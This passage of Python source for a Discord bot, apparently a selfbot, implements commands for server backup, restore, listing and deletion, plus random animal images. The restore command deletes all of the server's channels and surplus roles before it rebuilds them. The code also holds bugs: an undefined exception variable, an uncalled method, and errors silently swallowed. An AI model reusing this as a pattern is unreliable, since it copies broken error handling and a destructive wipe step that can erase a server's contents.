        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36'}
        if server.is_icon_animated():
            extension = "gif"
        else:
            extension = "png"
        response = requests.get(icon_url, stream=True, headers=headers)
        os.makedirs(os.path.dirname(f'./Backups/{name}/{name}.{extension}'), exist_ok=True)
        with open(f'./Backups/{name}/{name}.{extension}', 'wb') as out_file:
            shutil.copyfileobj(response.raw, out_file)
        
        try:
            statusembed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Backup',timestamp=embed_timestamp())
            statusembed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            statusembed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            statusembed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            statusembed.description = "Saving roles from server..."
            await statusmsg.edit(embed=statusembed)
        except:
            pass

        for role in server.roles:
            try:
                if role.managed:
                    continue
                server_data["roles"].append({
                    "id": str(role.id),
                    "default": role.is_default(),
                    "name": role.name,
                    "permissions": role.permissions.value,
                    "color": role.color.value,
                    "hoist": role.hoist,
                    "position": role.position,
                    "mentionable": role.mentionable
                })
            except Exception:
                try:
                    statusembed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Backup',timestamp=embed_timestamp())
                    statusembed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    statusembed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    statusembed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    statusembed.description = "Failed to save roles from server..."
                    await statusmsg.edit(embed=statusembed)
                except:
                    pass
                pass
        
        try:
            statusembed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Backup',timestamp=embed_timestamp())
            statusembed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            statusembed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            statusembed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            statusembed.description = "Saving channels from server..."
            await statusmsg.edit(embed=statusembed)
        except:
            pass

        for category in server.categories:
            try:
                server_data["categories"].append({
                    "name": category.name,
                    "position": category.position,
                    "category": None if category.category is None else str(category.category.id),
                    "id": str(category.id),
                    "overwrites": _overwrites_to_json(category.overwrites)
                })
            except Exception:
                pass
                try:
                    statusembed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Backup',timestamp=embed_timestamp())
                    statusembed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    statusembed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    statusembed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    statusembed.description = "Failed to save categories from server..."
                    await statusmsg.edit(embed=statusembed)
                except:
                    pass

        for tchannel in server.text_channels:
            try:
                server_data["text_channels"].append({
                    "name": tchannel.name,
                    "position": tchannel.position,
                    "category": None if tchannel.category is None else str(tchannel.category.id),
                    "id": str(tchannel.id),
                    "overwrites": _overwrites_to_json(tchannel.overwrites),
                    "topic": tchannel.topic,
                    "slowmode_delay": tchannel.slowmode_delay,
                    "nsfw": tchannel.is_nsfw(),
                    "messages": [],
                    "webhooks": []
                })
            except Exception:
                pass
                try:
                    statusembed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Backup',timestamp=embed_timestamp())
                    statusembed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    statusembed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    statusembed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    statusembed.description = "Failed to save text channels from server..."
                    await statusmsg.edit(embed=statusembed)
                except:
                    pass


        for vchannel in server.voice_channels:
            try:
                server_data["voice_channels"].append({
                    "name": vchannel.name,
                    "position": vchannel.position,
                    "category": None if vchannel.category is None else str(vchannel.category.id),
                    "id": str(vchannel.id),
                    "overwrites": _overwrites_to_json(vchannel.overwrites),
                    "bitrate": vchannel.bitrate,
                    "user_limit": vchannel.user_limit,
                })
            except Exception:
                pass
                try:
                    statusembed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Backup',timestamp=embed_timestamp())
                    statusembed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    statusembed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    statusembed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    statusembed.description = "Failed to save voice channels from server..."
                    await statusmsg.edit(embed=statusembed)
                except:
                    pass

        # Saving Banns
        try:
            statusembed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Backup',timestamp=embed_timestamp())
            statusembed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            statusembed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            statusembed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            statusembed.description = "Saving bans from server..."
            await statusmsg.edit(embed=statusembed)
        except:
            pass
        try:
            for reason, user in await server.bans():
                try:
                    server_data["bans"].append({
                        "user": str(user.id),
                        "reason": reason
                    })
                except Exception:
                    pass
        except Exception:
            pass
            try:
                statusembed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Backup',timestamp=embed_timestamp())
                statusembed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                statusembed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                statusembed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                statusembed.description = "Failed to save bans from server due to insufficient permissions..."
                await statusmsg.edit(embed=statusembed)
            except:
                pass

        # os.makedirs(os.path.dirname(f'./Backups/{name}/{name}.json'), exist_ok=True)

        with open(f'./Backups/{name}/{name}.json', 'w+') as f:
            json.dump(server_data, f, indent=4)
        # Saving Emojis
        os.makedirs(f'./Backups/{name}/emojis', exist_ok=True)
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36'}
            emoji_names = []
            for emoji in server.emojis:
                if emoji.animated:
                    extension = "gif"
                else:
                    extension = "png"
                count = emoji_names.count(emoji.name)
                response = requests.get(emoji.url, stream=True, headers=headers)
                if count == 0:
                    with open(f"./Backups/{name}/emojis/{emoji.name}.{extension}", 'wb') as out_file:
                        shutil.copyfileobj(response.raw, out_file)
                else:
                    with open(f"./Backups/{name}/emojis/{emoji.name}~{count}.{extension}", 'wb') as out_file:
                        shutil.copyfileobj(response.raw, out_file)
                emoji_names.append(emoji.name)
        except Exception:
            pass
            try:
                statusembed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Backup',timestamp=embed_timestamp())
                statusembed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                statusembed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                statusembed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                statusembed.description = "Failed to save emojis from server..."
                await statusmsg.edit(embed=statusembed)
            except:
                pass
        
        try:
            statusembed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Backup',timestamp=embed_timestamp())
            statusembed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            statusembed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            statusembed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            statusembed.description = "Finished backing up server."
            await statusmsg.edit(embed=statusembed, delete_after=json.load(open('config.json', encoding='utf-8'))['delete_timeout'])
        except:
            pass


    @React.command(usage="loadbackup <Name>", description="Loads a full server backup")
    async def loadbackup(ctx, *, name=None):
        if name:
            try:
                with open(f'./Backups/{name}/{name}.json', 'r') as f:
                    server_data = json.load(f)
            except:
                pass
                try:
                    statusembed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Backup',timestamp=embed_timestamp())
                    statusembed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    statusembed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    statusembed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    statusembed.description = "Failed to find backup."
                    await embed_or_codeblock(ctx, statusembed)


                except:
                    pass
                
            server = ctx.guild
            id_translator = {}
            semaphore = asyncio.Semaphore(2)
            async def _overwrites_from_json(json):
                overwrites = {}
                for union_id, overwrite in json.items():
                    try:
                        union = await server.fetch_member(int(union_id))
                    except discord.NotFound:
                        roles = list(
                            filter(lambda r: r.id == id_translator.get(union_id), server.roles))
                        if len(roles) == 0:
                            continue
                        union = roles[0]
                    overwrites[union] = discord.PermissionOverwrite(**overwrite)
                return overwrites

            def _translate_mentions(text):
                if not text:
                    return text
                formats = ["<#%s>", "<@&%s>"]
                for key, value in id_translator.items():
                    for _format in formats:
                        text = text.replace(_format % str(key), _format % str(value))
                return text

            async def run_tasks(coros, wait=True):
                async def executor(_coro):
                    try:
                        await _coro
                    except Exception:
                        pass
                    finally:
                        semaphore.release()
                tasks = []
                for coro in coros:
                    await semaphore.acquire()
                    tasks.append(React.loop.create_task(executor(coro)))
                if wait and tasks:
                    await asyncio.wait(tasks)

            async def _prepare_guild():
                # Deleting roles on server
                existing_roles = list(filter(lambda r: not r.managed and not r.is_default, server.roles))
                difference = len(server_data["roles"]) - len(existing_roles)
                for role in server.roles:
                    if difference < 0:
                        try:
                            await role.delete()
                        except Exception:
                            pass
                        else:
                            difference += 1
                    else:
                        break
                # Deleting channels on server
                for channel in server.channels:
                    try:
                        await channel.delete()
                    except Exception:
                        pass

            async def _load_settings():
                # Loading settings
                await server.edit(
                    name=server_data["name"],
                    # region=discord.VoiceRegion(server_data["region"]),
                    afk_channel=server.get_channel(id_translator.get(server_data["afk_channel"])),
                    afk_timeout=server_data["afk_timeout"],
                    # verification_level=discord.VerificationLevel(server_data["verification_level"]),
                    system_channel=server.get_channel(id_translator.get(server_data["system_channel"]))
                )
                try:
                    with open(f'./Backups/{name}/{name}.gif', 'rb') as f:
                        icon = f.read()
                    await server.edit(icon=icon)
                except:
                    with open(f'./Backups/{name}/{name}.png', 'rb') as f:
                        icon = f.read()
                    await server.edit(icon=icon)
            async def _load_roles():
                # Loading roles
                existing_roles = list(reversed(list(filter(lambda r: not r.managed and not r.is_default(), server.roles))))
                for role in reversed(server_data["roles"]):
                    try:
                        if role["default"]:
                            await server.default_role.edit(permissions=discord.Permissions(role["permissions"]))
                            new_role = server.default_role
                        else:
                            kwargs = {
                                "name": role["name"],
                                "hoist": role["hoist"],
                                "mentionable": role["mentionable"],
                                "color": discord.Color(role["color"]),
                                "permissions": discord.Permissions.none(),
                                "reason": ""
                            }
                            if len(existing_roles) == 0:
                                try:
                                    new_role = await asyncio.wait_for(server.create_role(**kwargs), 10)
                                except asyncio.TimeoutError:
                                    # Probably hit the 24h rate limit. Just skip roles
                                    break
                            else:
                                new_role = existing_roles.pop(0)
                                await new_role.edit(**kwargs)
                        id_translator[role["id"]] = new_role.id
                    except Exception:
                        pass

            async def _load_role_permissions():
                # Loading role permissions
                tasks = []
                for role in server_data["roles"]:
                    to_edit = server.get_role(id_translator.get(role["id"]))
                    if to_edit:
                        tasks.append(to_edit.edit(permissions=discord.Permissions(role["permissions"])))
                await run_tasks(tasks)

            async def _load_categories():
                # Loading categories
                for category in server_data["categories"]:
                    try:
                        created = await server.create_category_channel(name=category["name"], overwrites=await _overwrites_from_json(category["overwrites"]))
                        id_translator[category["id"]] = created.id
                    except Exception:
                        pass

            async def _load_text_channels():
                # Loading text channels
                for tchannel in server_data["text_channels"]:
                    try:
                        if tchannel["category"]:
                            created = await server.create_text_channel(name=tchannel["name"], overwrites=await _overwrites_from_json(tchannel["overwrites"]), category=discord.Object(id_translator.get(tchannel["category"])))
                        else:
                            created = await server.create_text_channel(name=tchannel["name"], overwrites=await _overwrites_from_json(tchannel["overwrites"]))
                        id_translator[tchannel["id"]] = created.id
                        await created.edit(topic=_translate_mentions(tchannel["topic"]), nsfw=tchannel["nsfw"])
                    except Exception:
                        pass

            async def _load_voice_channels():
                # Loading voice channels
                for vchannel in server_data["voice_channels"]:
                    try:
                        if vchannel["category"]:
                            created = await server.create_voice_channel(name=vchannel["name"], overwrites=await _overwrites_from_json(vchannel["overwrites"]), category=discord.Object(id_translator.get(vchannel["category"])))
                        else:
                            created = await server.create_voice_channel(name=vchannel["name"], overwrites=await _overwrites_from_json(vchannel["overwrites"]),)
                        await created.edit(bitrate=vchannel["bitrate"], user_limit=vchannel["user_limit"])
                        id_translator[vchannel["id"]] = created.id
                    except Exception:
                        pass

            async def _load_channels():
                await _load_categories()
                await _load_text_channels()
                await _load_voice_channels()

            async def _load_bans():
                # Loading bans
                tasks = [server.ban(user=discord.Object(int(ban["user"])), reason=ban["reason"]) for ban in server_data["bans"]]
                await run_tasks(tasks)

            async def _load_emojis():
                # Loading Emojis
                for emoji in os.listdir(f'./Backups/{name}/emojis'):
                    with open(f'./Backups/{name}/emojis/{emoji}', 'rb') as img:
                        img_byte = img.read()
                        try:
                            await server.create_custom_emoji(name=emoji[:-4], image=img_byte)
                        except Exception:
                            # Failed to save an emoji
                            pass

            async def load():
                # Loading backup
                try:
                    await _prepare_guild()
                except Exception:
                    pass
                steps = [("roles", _load_roles), ("channels", _load_channels), ("settings", _load_settings), ("bans", _load_bans), ("roles", _load_role_permissions)]
                for option, coro in steps:
                    try:
                        await coro()
                    except Exception:
                        print(f"Error: {e}")
                # Finished loading backup
            await load()
        else:
            # Please select a backup name
            pass


    @React.command(usage="listbackup", description="Shows all server backups")
    async def listbackup(ctx):
        try:
            statusembed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Backup', description='\n'.join(os.listdir('./Backups')) or "None",timestamp=embed_timestamp())
            statusembed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            statusembed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            statusembed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, statusembed)


        except:
            pass


    @React.command(aliases=['delbackup'], usage="deletebackup <Name>", description="Deletes a server backup")
    async def deletebackup(ctx, *, backup_name):
        try:
            shutil.rmtree(f'./Backups/{backup_name}')
            statusembed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Backup',timestamp=embed_timestamp())
            statusembed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            statusembed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            statusembed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            statusembed.description = "Deleted server backup."
            await embed_or_codeblock(ctx, statusembed)


        except:
            statusembed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Backup',timestamp=embed_timestamp())
            statusembed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            statusembed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            statusembed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            statusembed.description = "Failed to delete server backup."
            await embed_or_codeblock(ctx, statusembed)




    @React.command(usage="dog", description="Sends a random dog image")
    async def dog(ctx):
        
        request = requests.get('https://dog.ceo/api/breeds/image/random')
        data = request.json()
        image_url = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Dog',timestamp=embed_timestamp())
        embed.set_image(url=image_url)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="fox", description="Sends a random fox image")
    async def fox(ctx):
        
        request = requests.get('https://randomfox.ca/floof/')
        data = request.json()
        image_url = data['image']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Fox',timestamp=embed_timestamp())
        embed.set_image(url=image_url)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="duck", description="Sends a random duck image")
    async def duck(ctx):
        
        request = requests.get('https://random-d.uk/api/random')
        data = request.json()
        image_url = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Duck',timestamp=embed_timestamp())
        embed.set_image(url=image_url)
